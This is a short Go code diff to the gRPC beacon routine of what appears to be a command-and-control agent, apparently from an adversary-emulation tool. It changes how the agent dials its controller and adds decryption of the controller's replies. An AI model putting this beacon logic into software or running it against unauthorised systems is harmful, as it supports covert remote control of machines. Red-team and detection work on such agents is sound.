@@ -46,7 +46,7 @@ func (contact GRPC) Communicate(address string, sleep int, beacon Beacon) {
 }
 
 func beaconSend(address string, beacon Beacon) []byte {
-	conn, err := grpc.Dial(address, grpc.WithInsecure(), grpc.WithBlock())
+	conn, err := grpc.Dial(address, grpc.WithInsecure())
 	if err != nil {
 		log.Fatalf("[-] %s is either unavailable or a firewall is blocking traffic.", address)
 	}
@@ -59,8 +59,7 @@ func beaconSend(address string, beacon Beacon) []byte {
 	data, _ := json.Marshal(beacon)
 	r, err := c.Handle(ctx, &pb.BeaconIncoming{Beacon: string(util.Encrypt(data))})
 	if err != nil {
-		log.Println(err)
-		return nil
+		return nil //no instructions for me
 	}
-	return []byte(r.GetBeacon())
+	return []byte(util.Decrypt(r.GetBeacon()))
 }
